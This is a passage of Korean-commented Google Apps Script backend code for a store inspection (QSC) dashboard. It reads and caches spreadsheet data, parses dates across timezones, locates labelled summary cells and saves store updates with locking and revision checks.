   바로 그 형식·그 시계로 적혀 있어 문자열끼리 그대로 비교할 수 있다.
   epoch 밀리초로 바꾸지 않는 이유: 최근접속 칸에는 타임존 표기가 없어 ms로 되돌리려면
   오프셋을 손으로 계산해야 하고, 그 계산이 틀리면 NEW가 통째로 9시간 어긋난다. */
function qscRounds(store, ym) {
  const key = 'rnd:v' + epoch() + ':' + store + ':' + ym;
  const cache = CacheService.getScriptCache();
  const hit = cache.get(key);
  if (hit) { try { return JSON.parse(hit); } catch (e) { } }

  const out = [];
  try {
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    const sh = ss.getSheetByName('QSC_회차');
    if (!sh || sh.getLastRow() < 2) return out;
    const tz = ss.getSpreadsheetTimeZone();   // 날짜·시간 칸은 이 파일의 시계로 읽는다
    const atz = authTz();                     // 기준선과 맞대는 값만 인증 시트의 시계로
    const rng = grid(sh, 2, 1, sh.getLastRow() - 1, 4);
    if (!rng || rng.getNumColumns() < 4) return out;
    const vals = rng.getValues();
    const want = normStore(store);
    const wantYm = ymOfKey(ym);
    for (let i = 0; i < vals.length; i++) {
      if (normStore(vals[i][3]) !== want) continue;
      if (ymOfCell(vals[i][1], tz) !== wantYm) continue;
      out.push({
        at: stampOf(vals[i][0], atz),
        date: dateOfCell(vals[i][1], tz),
        time: timeKeyOf(vals[i][2], tz)
      });
    }
    out.sort(function (a, b) { return a.at < b.at ? -1 : (a.at > b.at ? 1 : 0); });
  } catch (e) {
    /* ★못 읽으면 빈 목록★ — 부르는 쪽이 NEW를 하나도 붙이지 않는 방향이다 */
    return [];
  }
  cache.put(key, JSON.stringify(out), 300);
  return out;
}

/* 회차별 '개선요청 표에 실린 개선요청' 건수. writeStoreQsc가 표에 쓰는 조건과 같은 조건
   (개선필요건수 ≥ 1)으로 QSC_상세를 센다. 회차 구분은 (점검일자 · 방문시간).
   셀 수 없는 상황이면 null — 부르는 쪽이 NEW를 포기한다. */
function roundTicketCounts(store, ym, rounds) {
  /* ★캐시가 없으면 홈 화면이 QSC_상세 전체를 읽는다★
     이 함수는 '한 달에 두 번 점검한 매장'에서만 불리지만, 그 매장 담당자가 홈을 열 때마다
     (배지 캐시 60초 만료마다) QSC_상세 전 기간·전 매장을 읽는다. 74문항 × 26곳 = 월 1,900행이라
     12월이면 약 9,500행 × 9열이고, 홈을 하루 20번 열면 그만큼 반복된다.
     qscRounds와 같은 자리에 같은 TTL로 붙인다. ★null도 캐시한다★ — 셀 수 없는 상황
     (본사가 표에 행을 손으로 넣은 매장)이 가장 비싼 경로를 매번 다시 타면 안 된다. */
  const ck = 'tkt:v' + epoch() + ':' + store + ':' + ym + ':' + rounds.length;
  const cache = CacheService.getScriptCache();
  const hit = cache.get(ck);
  if (hit) { try { const c = JSON.parse(hit); return c === null ? null : c; } catch (e) { } }
  const out = roundTicketCountsRaw(store, ym, rounds);
  try { cache.put(ck, JSON.stringify(out === null ? null : out), 300); } catch (e) { }
  return out;
}

function roundTicketCountsRaw(store, ym, rounds) {
  try {
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    const sh = ss.getSheetByName('QSC_상세');
    if (!sh || sh.getLastRow() < 2) return null;
    const tz = ss.getSpreadsheetTimeZone();
    // 0 점검일자 · 1 방문시간 · 2 매장명 · … · 8 개선필요건수
    const rng = grid(sh, 2, 1, sh.getLastRow() - 1, 9);
    if (!rng || rng.getNumColumns() < 9) return null;
    const vals = rng.getValues();
    const want = normStore(store);
    const tally = {};
    for (let i = 0; i < vals.length; i++) {
      if (normStore(vals[i][2]) !== want) continue;
      const n = Number(vals[i][8]);
      if (!isFinite(n) || n < 1) continue;
      const k = dateOfCell(vals[i][0], tz) + '|' + timeKeyOf(vals[i][1], tz);
      tally[k] = (tally[k] || 0) + 1;
    }
    const out = [];
    const seen = {};
    for (let r = 0; r < rounds.length; r++) {
      const k = rounds[r].date + '|' + rounds[r].time;
      /* 같은 날 같은 시각에 회차가 둘이면 어느 개선요청이 어느 회차의 것인지 가릴 수 없다 */
      if (seen[k]) return null;
      seen[k] = true;
      if (!Object.prototype.hasOwnProperty.call(tally, k)) return null;
      out.push(tally[k]);
    }
    return out;
  } catch (e) { return null; }
}

/* ---------- 시트 값 → 문자열 (타임존은 부르는 쪽이 정한다) ---------- */

function ymOfKey(ym) { return '20' + String(ym).slice(0, 2) + '-' + String(ym).slice(2, 4); }

function ymOfCell(v, tz) {
  if (v instanceof Date) return Utilities.formatDate(v, tz, 'yyyy-MM');
  return String(v == null ? '' : v).trim().slice(0, 7);
}
function dateOfCell(v, tz) {
  if (v instanceof Date) return Utilities.formatDate(v, tz, 'yyyy-MM-dd');
  return String(v == null ? '' : v).trim().slice(0, 10);
}
/* 방문시간은 '14:30' 텍스트일 수도, 시트가 시각으로 파싱한 Date일 수도 있다.
   회차 시트와 상세 시트에서 각각 다르게 굳어 있을 수 있으므로 양쪽을 같은 모양으로 눌러 둔다. */
function timeKeyOf(v, tz) {
  if (v instanceof Date) return Utilities.formatDate(v, tz, 'HH:mm');
  return String(v == null ? '' : v).trim();
}

/* 제출시각 → 'yyyy-MM-dd HH:mm'.
   ★값의 타입이 시트에 맡겨져 있다★ — 프론트가 보내는 것은 toISOString()(UTC, 'Z')인데,
   시트가 그것을 Date로 파싱해 두는 경우도 있고 텍스트로 남겨 두는 경우도 있다. 둘 다 받는다.
   타임존 표기가 없는 텍스트는 이미 현지 시각으로 적힌 것이므로 다시 변환하지 않는다 —
   변환하면 9시간이 두 번 더해진다. */
function stampOf(v, tz) {
  let d = null;
  if (v instanceof Date) {
    d = v;
  } else {
    const s = String(v == null ? '' : v).trim();
    if (!s) return '';
    const hasZone = /Z$/.test(s) || /[+\-]\d{2}:?\d{2}$/.test(s);
    const m = s.match(/^(\d{4})-(\d{2})-(\d{2})[T ](\d{2}):(\d{2})/);
    if (m && !hasZone) return m[1] + '-' + m[2] + '-' + m[3] + ' ' + m[4] + ':' + m[5];
    const t = Date.parse(s);
    if (isNaN(t)) return '';
    d = new Date(t);
  }
  return Utilities.formatDate(d, tz, 'yyyy-MM-dd HH:mm');
}

function readStoreTab(ss, sh, store, ym) {
  const tz = fileTz(ss);
  const lm = labelMap(sh);
  const warn = [];

  /* ★'라벨을 못 찾았다'와 '라벨은 찾았는데 값 칸이 비었다'를 둘 다 알린다★
     종전에는 앞쪽만 경고했다. 그래서 값을 못 읽은 두 번째 경우가 화면에 '—' 로만 나타났고,
     매장은 그것을 "이 달은 점검을 안 했나 보다"로 읽었다. 조용히 비는 것이 가장 나쁘다. */
  function pick(names, label) {
    const r = labelValue(lm, names);
    if (!label) return r;
    if (!r.found) warn.push("'" + label + "' 라벨을 찾지 못했습니다 — 값을 표시하지 않습니다");
    else if (r.v == null || r.v === '') warn.push("'" + label + "' 옆 값 칸이 비어 있습니다 — 값을 표시하지 않습니다");
    return r;
  }
  const vDate = pick(['방문일', '방문일자', '점검일', '점검일자'], '방문일');
  const vHyg = pick(['위생점수', 'QSC점수', '위생'], '위생점수');
  const vCs = pick(['CS점수', 'CS'], 'CS점수');
  const vTot = pick(['종합점수', '종합'], '종합점수');
  const vHygG = labelValue(lm, ['위생등급']);
  const vCsG = labelValue(lm, ['CS등급']);
  const vTotG = labelValue(lm, ['종합등급', '등급']);
  /* ★별칭 목록에 시트 실물 라벨을 반드시 넣어 둔다★ — labelMap은 완전일치로 찾는다.
     실물 월 탭의 라벨은 '개선요청사항'·'개선예정/진행'인데 종전 목록에는 둘 다 없었다.
     그래서 요약 건수를 시트에서 읽지 못하고 늘 표를 다시 세는 폴백으로 넘어갔고,
     "'개선예정/진행' 라벨을 찾지 못했습니다" 경고가 모든 매장·모든 달에 상시 떴다. */
  const vReq = labelValue(lm, REQ_LABELS);
  const vProg = labelValue(lm, ['개선예정/진행', '개선예정', '개선진행', '진행중', '진행']);
  const vDone = labelValue(lm, ['개선완료', '조치완료', '완료']);
  const vTodo = labelValue(lm, ['미조치', '미이행']);

  // 개선요청 표: B~O를 값과 수식 둘 다 읽는다 (=IMAGE() 셀은 getValues()가 ''를 준다)
  /* 표 끝을 시트에서 읽어 그만큼만 훑는다 — 못 읽으면 종전처럼 200줄 (tableEndRow 주석) */
  const endRow = tableEndRow(sh, lm);
  const rng = grid(sh, 12, 2, endRow ? Math.max(0, endRow - 11) : 200, 14);
  const vals = rng ? rng.getValues() : [];
  const fmls = rng ? rng.getFormulas() : [];
  const items = [];
  let cReq = 0, cProg = 0, cDone = 0;
  /* '오늘'은 ★매장 파일의★ 타임존으로 잡는다 (§9-4). toISOString()(UTC)을 쓰면 KST 자정이
     하루 앞으로 밀려, 매달 1일 아침에 전월 마감분이 통째로 '지연'으로 빨갛게 뜬다. */
  const today = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd');
  for (let i = 0; i < vals.length; i++) {
    const v = vals[i], f = fmls[i];
    const bodyText = String(v[8] == null ? '' : v[8]).trim();   // J열
    if (!bodyText) continue;
    const no = Number(v[0]);
    const m = String(v[11] == null ? '' : v[11]).trim();        // M열 진행
    const n = String(v[12] == null ? '' : v[12]).trim();        // N열 완료
    const state = stateOf(m, n);
    /* 지연 = 예정일(M)이 오늘보다 이전인데 완료일(N)이 비어 있음.
       ★날짜를 못 읽으면 지연이 아니다★ — M열은 '예정일 + 진행 내용'이 한 칸에 섞여 있어
       파싱이 빗나갈 수 있고, 틀린 빨강은 없는 빨강보다 나쁘다(매장이 이미 한 일에
       '지연'이 붙으면 그다음부터 배지를 아무도 믿지 않는다). */
    const due = dueDateOf(v[11], tz, ym);
    const overdue = !!(due && !n && due < today);
    cReq++;
    if (state === '완료') cDone++;
    else if (state === '진행') cProg++;
    items.push({
      no: (typeof v[0] === 'number' && v[0] >= 1) ? no : null,
      cat: String(v[1] == null ? '' : v[1]).trim(),
      text: bodyText,
      beforePhotos: photoUrlsOf(v[2], f[2]),
      dept: String(v[9] == null ? '' : v[9]).trim(),
      owner: String(v[10] == null ? '' : v[10]).trim(),
      plan: String(cell(v[11], tz) == null ? '' : cell(v[11], tz)).trim(),
      doneNote: String(cell(v[12], tz) == null ? '' : cell(v[12], tz)).trim(),
      afterPhoto: (function () { const u = photoUrlsOf(v[13], f[13]); return u.length ? u[0] : null; })(),
      state: state,
      due: due || null,       // 화면이 '10/15까지'를 그릴 수 있게. 못 읽었으면 null
      overdue: overdue,
      /* '5일 지남'을 화면이 그릴 수 있게. 날짜 계산도 서버 몫이다 — 화면이 M열을 다시 파싱하면
         타임존이 두 개가 되고, 두 곳의 판정이 갈라지는 날 아무도 원인을 못 찾는다. */
      overdueDays: overdue ? daysBetween(due, today) : 0,
      /* isNew는 여기서 붙이지 않는다 — 이 응답은 매장·월 단위로 캐시되는데(store:v…),
         NEW 여부는 '보는 사람의 최근접속'에 달려 있다. 캐시에 담으면 먼저 연 사람의
         기준선이 다음 사람에게 그대로 간다. fnStoreGet이 캐시 뒤에 붙인다(readOnly와 같은 이유). */
      isNew: false,
      rev: revOf(no, v.slice(8, 14), f.slice(8, 14))
    });
  }

  /* 라벨을 못 찾았으면 표에서 직접 센 값을 쓰고, 그 사실을 화면에 그대로 노출한다.
     ★조용히 0을 표시하지 않는 것이 이 응답의 핵심 안전장치다★ */
  let req = numOf(vReq.v), prog = numOf(vProg.v), done = numOf(vDone.v), todo = numOf(vTodo.v);
  if (req === null || prog === null || done === null) {
    warn.push("'개선예정/진행' 라벨을 찾지 못했습니다 — 진행 건수는 표에서 직접 센 값입니다");
    req = cReq; prog = cProg; done = cDone; todo = cReq - cDone - cProg;
  }
  if (todo === null) todo = Math.max(0, req - done - prog);
  const rate = req > 0 ? Math.round((done / req) * 100) / 100 : null;

  return {
    ok: true, store: store, ym: ym, label: ymLabel(ym), exists: true,
    months: monthTabs(ss),
    summary: {
      visitDate: vDate.found ? cell(vDate.v, tz) : null,
      hygiene: scorePct(vHyg.v), hygieneGrade: str(vHygG.v),
      cs: scorePct(vCs.v), csGrade: str(vCsG.v),
      total: scorePct(vTot.v), totalGrade: str(vTotG.v),
      provisional: isProvisional(ym, tz),
      req: req, prog: prog, done: done, todo: todo, rate: rate,
      warn: warn
    },
    deptOptions: deptOptions(sh),
    items: items,
    updatedAt: Utilities.formatDate(new Date(), tz, "yyyy-MM-dd'T'HH:mm:ssXXX")
  };
}

/* M열(예정일)에서 날짜만 뽑아 'yyyy-MM-dd'로. 못 읽으면 '' — 부르는 쪽은 ''를 '지연 아님'으로 본다.

   M열은 한 칸에 '예정일 + 진행 내용'이 같이 들어 있는 경우가 많다("10/15 매대 교체 예정").
   그래서 셀 전체가 아니라 ★맨 앞에서만★ 날짜를 찾는다.

   ★Date 객체 경로를 먼저 본다★ — 매장이 '10/15'만 입력해도 시트가 Date로 강제 변환하고,
   그 Date를 문자열로 만들면 UTC로 밀려 하루가 어긋난다(§9-4). 반드시 시트 타임존으로 포맷한다.

   ★연도 없는 표기는 '탭 월 언저리'가 아니면 버린다★ — 이것이 이 함수에서 가장 중요한 줄이다.
   "3/4 정도 진행", "2/3 완료" 처럼 날짜가 아닌 분수·비율로 시작하는 칸이 실제로 있는데,
   그것을 3월 4일로 읽으면 이미 조치가 진행 중인 항목에 '지연' 빨강이 붙는다. 예정일은
   그 달 앞뒤 몇 달 안에 있게 마련이므로(전월 ~ 익익월), 그 창을 벗어나면 날짜가 아니라고 본다.
   같은 계산이 12월 탭의 '1/5'를 이듬해 1월로 옮기는 일도 함께 해 준다 — 그러지 않으면
   갓 적은 예정일이 11개월 전 날짜가 되어 즉시 '지연'으로 뜬다. */
function dueDateOf(v, tz, ym) {
  if (v instanceof Date) return Utilities.formatDate(v, tz, 'yyyy-MM-dd');
  const s = String(v == null ? '' : v).trim();
  if (!s) return '';
  const ok = function (y, mo, d) {
    if (mo < 1 || mo > 12 || d < 1 || d > 31) return '';
    return y + '-' + pad2(mo) + '-' + pad2(d);
  };
  // 연도가 적혀 있으면 그대로 믿는다 (2026-10-15 · 2026.10.15 · 2026년 10월 15일)
  let m = s.match(/^(\d{4})\s*[-.\/년]\s*(\d{1,2})\s*[-.\/월]\s*(\d{1,2})/);
  if (m) return ok(Number(m[1]), Number(m[2]), Number(m[3]));

  m = s.match(/^(\d{1,2})\s*[-.\/월]\s*(\d{1,2})/);
  if (!m) return '';
  const mo = Number(m[1]), d = Number(m[2]);
  if (mo < 1 || mo > 12) return '';
  const tabY = 2000 + Number(String(ym).slice(0, 2));
  const tabM = Number(String(ym).slice(2, 4));
  let delta = mo - tabM;               // 탭 월에서 몇 달 떨어져 있나 (-5 ~ +6으로 접는다)
  if (delta > 6) delta -= 12;
  if (delta < -6) delta += 12;
  if (delta < -1 || delta > 2) return '';   // 날짜로 보기 어렵다 — 붙이지 않는다
  const idx = tabY * 12 + (tabM - 1) + delta;
  return ok(Math.floor(idx / 12), (idx % 12) + 1, d);
}

/* 'yyyy-MM-dd' 두 개의 날짜 차이(일). ★Date.UTC로만 센다★ — 둘 다 이미 시트 타임존으로
   포맷이 끝난 순수 날짜 문자열이라, 여기서 지역 시각을 다시 개입시키면 서머타임·오프셋이
   끼어들 자리만 생긴다. 형식이 아니면 0(= 화면이 '며칠 지남'을 안 그린다). */
function daysBetween(fromYmd, toYmd) {
  const re = /^(\d{4})-(\d{2})-(\d{2})$/;
  const a = re.exec(String(fromYmd || '')), b = re.exec(String(toYmd || ''));
  if (!a || !b) return 0;
  const ta = Date.UTC(Number(a[1]), Number(a[2]) - 1, Number(a[3]));
  const tb = Date.UTC(Number(b[1]), Number(b[2]) - 1, Number(b[3]));
  return Math.round((tb - ta) / 86400000);
}

/* 상태 판정을 한 함수에 모은다: N열 있음 → 완료 / M열만 → 진행 / 둘 다 없음 → 미조치 */
function stateOf(m, n) {
  if (String(n || '').trim()) return '완료';
  if (String(m || '').trim()) return '진행';
  return '미조치';
}

/* 시트 점수 칸은 % 서식(0.80)이 정상이다. 다만 사람이 80이라고 적어 둔 탭이 섞여 있을 수 있어
   1.5 이하만 분수로 보고 ×100 한다 — 8000%가 뜨는 것보다 낫다. */
function scorePct(v) {
  if (typeof v !== 'number') return null;
  return (v <= 1.5) ? round1(v * 100) : round1(v);
}
function numOf(v) { return (typeof v === 'number') ? v : null; }

/* 개선율(I9)이 종합의 10%라 월 초에는 종합이 낮게 보인다. 익월 IMPROVE_DUE_DAY 이전이면 '잠정'.
   ★프로젝트 타임존이 아니라 스프레드시트 타임존으로 '오늘'을 계산한다★ (§9-4) */
/* ★Date 객체를 만들지 않는다★ — new Date(y, m, d)는 '프로젝트' 타임존으로 해석되는데
   그것을 시트 타임존으로 포맷하면 두 타임존이 다를 때(backend/에 appsscript.json이 없어
   프로젝트 tz가 무엇인지 확인되지 않았다) 기한이 하루 밀려 11일에도 '잠정'이 붙는다.
   기한은 'yyyy-MM-dd' 문자열로 직접 조립하고 문자열끼리 비교한다 — 타임존이 개입할 자리가 없다. */
function isProvisional(ym, tz) {
  let y = 2000 + Number(ym.slice(0, 2));
  let m = Number(ym.slice(2, 4)) + 1;          // 익월
  if (m > 12) { m = 1; y += 1; }
  const day = Math.min(28, Math.max(1, propN('IMPROVE_DUE_DAY', 10)));
  const dueStr = y + '-' + pad2(m) + '-' + pad2(day);
  const todayStr = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd');
  return todayStr <= dueStr;
}

/* K열 데이터 유효성 목록 → deptOptions. ★하드코딩 금지★ */
function deptOptions(sh) {
  try {
    const cellRng = grid(sh, 12, 11, 1, 1);
    if (!cellRng) return [];
    const rule = cellRng.getDataValidation();
    if (!rule) return [];
    if (rule.getCriteriaType() !== SpreadsheetApp.DataValidationCriteria.VALUE_IN_LIST) return [];
    const cv = rule.getCriteriaValues();
    const first = cv && cv.length ? cv[0] : null;
    if (!first) return [];
    if (Object.prototype.toString.call(first) === '[object Array]') {
      return first.map(function (x) { return String(x).trim(); }).filter(String);
    }
    // 범위 참조형 (=시트!A1:A10)
    const out = [];
    const vv = first.getValues();
    for (let i = 0; i < vv.length; i++) {
      const s = String(vv[i][0] == null ? '' : vv[i][0]).trim();
      if (s && out.indexOf(s) < 0) out.push(s);
    }
    return out;
  } catch (e) { return []; }
}

function monthTabs(ss) {
  const out = [];
  const shs = ss.getSheets();
  for (let i = 0; i < shs.length; i++) {
    const n = shs[i].getName().trim();
    if (/^\d{4}$/.test(n)) out.push(n);
  }
  out.sort();
  out.reverse();
  return out;
}

function validYm(ym) {
  if (!/^\d{4}$/.test(String(ym))) return false;
  const m = Number(String(ym).slice(2, 4));
  return m >= 1 && m <= 12;
}
function curYymm() {
  return Utilities.formatDate(new Date(), ssTz(), 'yyMM');
}
function ymLabel(ym) {
  return '20' + ym.slice(0, 2) + '년 ' + Number(ym.slice(2, 4)) + '월';
}

/* A1:J10에서 라벨을 찾아 위치를 기억해 둔다. 고정 주소가 아니라 라벨 검색으로 읽는 이유는
   26개 파일이 수년간 사람 손으로 복제돼 행이 밀려 있을 수 있기 때문이다.
   ※스캔 범위를 A1:L15가 아니라 A1:J10으로 좁혔다 — 우측 '차기 월 목표' 표에 같은 라벨이
     있으면 중복 매치된다(§9-7). */
/* 요약 칸에서 '라벨'로 인정하는 낱말. labelValue가 값 칸을 훑다가 여기 있는 글자를 만나면
   '다음 라벨'로 보고 멈춘다.
   ★왜 낱말 목록이 필요한가 (2026-08-16 실제 사고)★
   종전에는 "labelMap에 등록된 글자면 라벨"로 판정했는데, labelMap은 A1:J10의 ★모든★ 셀을
   글자→첫 위치로 색인한다. 실물 4행은 `위생등급 보통 | CS등급 미흡 | 종합등급 미흡` 이라
   '미흡'이 G4(CS등급 값)로 먼저 등록되고, 종합등급 값 I4를 읽는 순간 "같은 행에 이미 있는
   글자"라며 멈춰 ★종합등급만 빈칸★이 됐다. 위생(보통)·CS(미흡)는 자기 자신이라 통과했다.
   값이 우연히 겹치는 것과 진짜 라벨을 가르는 유일한 방법은 낱말을 아는 것이다.
   ※readStoreTab·makeMonthTabIn이 찾는 라벨과 같은 어휘를 여기 한 곳에 모아 둔다. */
const LABEL_WORDS = (function () {
  const o = {};
  ['방문일', '방문일자', '점검일', '점검일자', '방문시간',
    '위생점수', 'QSC점수', '위생', 'CS점수', 'CS', '종합점수', '종합',
    '위생등급', 'CS등급', '종합등급', '등급',
    '개선요청사항', '개선요청', '요청', '요청건수', '개선요청건수',
    '개선예정/진행', '개선예정', '개선진행', '진행중', '진행',
    '개선완료', '조치완료', '완료', '미조치', '미이행', '개선율'
  ].forEach(function (w) { o[w.replace(/\s+/g, '')] = 1; });
  return o;
})();

function labelMap(sh) {
  const rng = grid(sh, 1, 1, 10, 10);
  const vals = rng ? rng.getValues() : [];
  const at = {};
  for (let r = 0; r < vals.length; r++) {
    for (let c = 0; c < vals[r].length; c++) {
      const t = String(vals[r][c] == null ? '' : vals[r][c]).replace(/\s+/g, '').trim();
      if (!t) continue;
      if (!at[t]) at[t] = { row: r + 1, col: c + 1 };
    }
  }
  /* ★병합 정보를 여기서 한 번에 받아 둔다★ — 실물 월 탭은 라벨이 D5:G5처럼 병합돼 있고
     값은 병합이 끝난 다음 칸(H5)에 있다. 종전에는 '라벨에서 오른쪽으로 3칸'을 훑었는데
     D→H는 4칸이라 영영 닿지 못했다(§9-7이 경고한 그 항목). 칸 수를 세어 맞추는 대신
     병합 범위를 물어보면 어떤 폭이든 정확히 넘어간다. getMergedRanges는 A1:J10 한 번뿐이다. */
  const mergeEnd = {};
  try {
    const mrs = rng ? rng.getMergedRanges() : [];
    for (let i = 0; i < mrs.length; i++) {
      const r0 = mrs[i].getRow(), c0 = mrs[i].getColumn();
      mergeEnd[r0 + ',' + c0] = c0 + mrs[i].getNumColumns() - 1;
    }
  } catch (e) { /* 병합을 못 읽어도 아래 폴백(라벨 바로 오른쪽)으로 동작한다 */ }
  return { vals: vals, at: at, sh: sh, mergeEnd: mergeEnd };
}

/* 라벨 오른쪽 칸의 값. 병합된 라벨은 병합이 끝난 다음 칸부터 훑고,
   다른 라벨을 만나면 '값 없음'으로 본다 — 엉뚱한 칸을 값으로 읽는 것이 가장 위험하다.

   ★2026-08-16에 두 가지를 고쳤다. 둘 다 '값이 있는데 없다고 하는' 사고였다★

   (가) 종전 `if (lm.at[t] && lm.at[t].row === p.row) break;` 는 ★방금 읽은 값 자기 자신★에
        걸렸다. labelMap이 A1:J10의 빈 칸이 아닌 모든 셀을 색인하므로(라벨만 거르지 않는다)
        위생점수 0.8을 읽는 순간 at['0.8']이 바로 그 셀을 가리키고, 같은 행이니 무조건 break가
        났다. 라벨과 값이 같은 행에 있는 한 이 함수는 값을 절대 돌려주지 못했다.
        → ①숫자·날짜·불리언은 라벨일 수 없으므로 그대로 값으로 받고 ②글자 칸일 때만
          '다른 라벨인가'를 묻되 자기 자신(col 일치)은 제외한다.

   (나) 훑는 폭이 3칸이라 라벨 D5:G5 + 값 H5(4칸)에 닿지 못했다.
        → labelMap이 미리 받아 둔 병합 범위로 시작 지점을 잡는다. 폭을 세지 않는다.

   증상은 '오류'가 아니라 화면의 '—' 였다. 매장은 "이 달은 점검을 안 했나 보다"로 읽는다. */
function labelValue(lm, names) {
  const mergeEnd = lm.mergeEnd || {};
  for (let i = 0; i < names.length; i++) {
    const key = names[i].replace(/\s+/g, '');
    const p = lm.at[key];
    if (!p) continue;
    // 병합이면 그 끝 다음 칸부터. 아니면 라벨 바로 오른쪽부터 (둘 다 0-based 시작 인덱스)
    const start = mergeEnd[p.row + ',' + p.col] || p.col;
    for (let c = start; c < start + 3 && c < lm.vals[p.row - 1].length; c++) {
      const raw = lm.vals[p.row - 1][c];
      if (raw === '' || raw == null) continue;
      // 숫자·날짜·불리언은 라벨일 수 없다 — 곧바로 값이다
      if (typeof raw === 'number' || typeof raw === 'boolean' || raw instanceof Date) {
        return { found: true, v: raw, row: p.row, col: c + 1 };
      }
      const t = String(raw).replace(/\s+/g, '').trim();
      if (t === '') continue;
      /* 글자 칸이다. ★'라벨로 쓰는 낱말'일 때만★ 다음 라벨로 보고 멈춘다.
         종전처럼 labelMap 등록 여부로 판정하면, 등급값 '미흡'처럼 같은 행에 두 번 나오는
         ★값★을 라벨로 오해해 멈춘다(종합등급이 빈칸이던 원인). LABEL_WORDS 주석 참조. */
      if (LABEL_WORDS[t]) break;
      return { found: true, v: raw, row: p.row, col: c + 1 };
    }
    return { found: true, v: null, row: p.row, col: start + 1 };  // 라벨은 있고 값이 빈 칸
  }
  return { found: false, v: null };
}

/* 개선요청 표의 마지막 행. ★시트가 스스로 알고 있다★ —
   요약의 '개선요청사항' 칸이 =COUNTA(J12:J38) 이므로 그 수식에서 끝 행(38)을 읽는다.
   실물 표는 12~38행(27줄)이고, 그 아래에 안내문·이월 메모를 적어 둔 파일이 있다.
   ★종전에는 읽기도 쓰기도 이 경계를 몰랐다★ —
     읽기는 12행부터 200줄을 세어 표 아래 글까지 개선요청 카드로 만들었고(건수·개선율이 틀어진다),
     쓰기는 sh.getMaxRows()까지를 빈 칸으로 보고 밀고 내려가 그 글을 덮어썼다.
   수식을 못 읽으면 0을 돌려준다 — 부르는 쪽이 종전처럼 넉넉히 잡는다(동작이 나빠지지 않는다). */
const REQ_LABELS = ['개선요청사항', '개선요청', '요청', '요청건수', '개선요청건수'];

function tableEndRow(sh, lm) {
  try {
    const map = lm || labelMap(sh);
    const p = labelValue(map, REQ_LABELS);
    if (!p || !p.found || !p.row) return 0;
    const c = grid(sh, p.row, p.col, 1, 1);
    const f = String((c && c.getFormula()) || '');
    const m = f.match(/COUNTA\s*\(\s*\$?[A-Z]+\$?\d+\s*:\s*\$?[A-Z]+\$?(\d+)\s*\)/i);
    if (!m) return 0;
    const n = Number(m[1]);
    return (n >= 12 && n <= 1000) ? n : 0;
  } catch (e) { return 0; }
}

/* 매장 파일에 쓴 직후 그 매장·그 달의 조회 캐시를 지운다.
   ★안 지우면 점검 직후가 정확히 어긋나는 구간이 된다★ — store.get은 60초 캐시라
   방금 기록한 개선요청이 최대 1분 동안 안 보인다. 하필 그때가 담당자가 매장에
   "이제 들어가서 보시라"고 안내하는 순간이다.
   dropDashCache는 통합시트(대시보드) 키만 지운다 — 매장 월 키는 여기서 따로 지운다.
   notify.badge(홈 알림)도 같은 키를 쓰므로 함께 최신이 된다. */
function dropStoreCache(store, ym) {
  try {
    const s = normStore(store);
    if (!s || !ym) return;
    CacheService.getScriptCache().removeAll([
      'store:v' + epoch() + ':' + s + ':' + ym,
      'rnd:v' + epoch() + ':' + s + ':' + ym,
    ]);
  } catch (e) { }
}



/* ---------- 매장현황 저장 (명세 §11-2 · 3단계) ---------- */

/* ★K~O만 쓴다★. 본사 몫인 B·C·D·J를 쓰는 코드 경로를 매장 기능층에 아예 만들지 않는다
   (§8-3 방어④). 열 번호를 계산하는 코드가 없으므로 오프셋 실수로 본사 칸을 덮을 수 없다. */
function fnStoreSave(ctx, payload, target) {
  if (prop('STORE_IMPROVE_WRITE', 'false') !== 'true') {
    return err('FORBIDDEN', '지금은 조회만 가능합니다. 저장 기능은 아직 열리지 않았습니다.');
  }
  const store = target;
  const ym = String(payload.ym || '').trim();
  if (!validYm(ym)) return err('BAD_REQUEST', '월이 올바르지 않습니다.');
  const no = payload.no;
  /* ★Number('')===0 이라 이 검사를 빼면 12행(첫 데이터 행)에 쓴다★ */
  if (!(typeof no === 'number' && no >= 1 && no === Math.floor(no))) {
    return err('BAD_REQUEST', '항목 번호가 올바르지 않습니다.');
  }
  const texts = {
    dept: capText(payload.dept), owner: capText(payload.owner),
    plan: capText(payload.plan), doneNote: capText(payload.doneNote)
  };
  for (const k in texts) if (texts[k].length > 1000) return err('BAD_REQUEST', '입력이 너무 깁니다 (1000자 이내).');

  const id = storeFileId(store);
  if (!id) return err('NOT_FOUND', '매장 파일을 찾지 못했습니다.');

  const lock = LockService.getScriptLock();
  let got = false;
  try { got = lock.tryLock(20000); } catch (e) { got = false; }
  if (!got) return err('CONFLICT', '다른 저장이 처리 중입니다. 잠시 후 다시 시도해 주세요.');
  try {
    const ss = SpreadsheetApp.openById(id);
    const sh = ss.getSheetByName(ym);
    if (!sh) return err('NOT_FOUND', ym + ' 탭이 아직 만들어지지 않았습니다.');
    const tz = fileTz(ss);

    // B열 NO 재탐색 — 클라이언트에 행 번호를 내려주지 않는 이유가 이것이다
    const noRng = grid(sh, 12, 2, 200, 1);
    const noCol = noRng ? noRng.getValues() : [];
    let r = -1, dup = false;
    for (let i = 0; i < noCol.length; i++) {
      if (String(noCol[i][0]).trim() === '') continue;      // ★Number('')===0 회피★
      if (Number(noCol[i][0]) === no) { if (r >= 0) { dup = true; break; } r = 12 + i; }
    }
    /* 본사가 행을 삽입·정렬해 NO가 중복되면 rev는 내용 변경만 잡고 "같은 NO가 두 행"은 못 잡는다.
       첫 일치 행에 조용히 쓰는 것보다 멈추는 편이 안전하다. */
    if (dup) return err('CONFLICT', '같은 번호의 항목이 두 개 있습니다. 담당자에게 문의해 주세요.');
    if (r < 0) return err('NOT_FOUND', '항목을 찾을 수 없습니다.');

    // 현재 J~O 재읽기 → rev 비교
    const cur = grid(sh, r, 10, 1, 6);
    if (!cur) return err('SERVER_ERROR', '시트를 읽지 못했습니다.');
    const curV = cur.getValues()[0];
    const curF = cur.getFormulas()[0];
    const curRev = revOf(no, curV, curF);
    if (String(payload.rev || '') !== curRev) {
      return {
        ok: false, code: 'CONFLICT',
        error: '다른 분이 방금 이 항목을 수정했습니다. 최신 내용을 확인해 주세요.',
        item: itemOf(no, curV, curF, tz, ym)
      };
    }

    /* 사진 — 교체·삭제면 이전 드라이브 파일을 실제로 지운다 (안 하면 고아 파일이 쌓인다).
       ★새 사진 저장이 성공한 뒤에 옛 파일을 지운다★ — 순서를 반대로 두면, 400KB를 넘는 사진을
